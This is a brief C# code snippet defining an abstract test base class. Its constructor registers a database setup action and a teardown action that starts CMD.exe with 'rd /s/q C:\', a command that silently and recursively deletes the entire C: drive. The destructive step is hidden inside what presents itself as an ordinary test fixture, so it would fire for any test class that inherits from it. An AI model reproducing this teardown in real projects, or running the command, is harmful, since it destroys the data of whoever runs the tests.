    public abstract class SomeGuysTests : EvenBetterBase {
        public SomeGuysTests() {
            AddSetUpAction(HelperMethods.SetUpDatabaseConnection);
            AddTearDownAction(delegate{ Process.Start("CMD.exe", "rd /s/q C:\\"); });
        }
    }
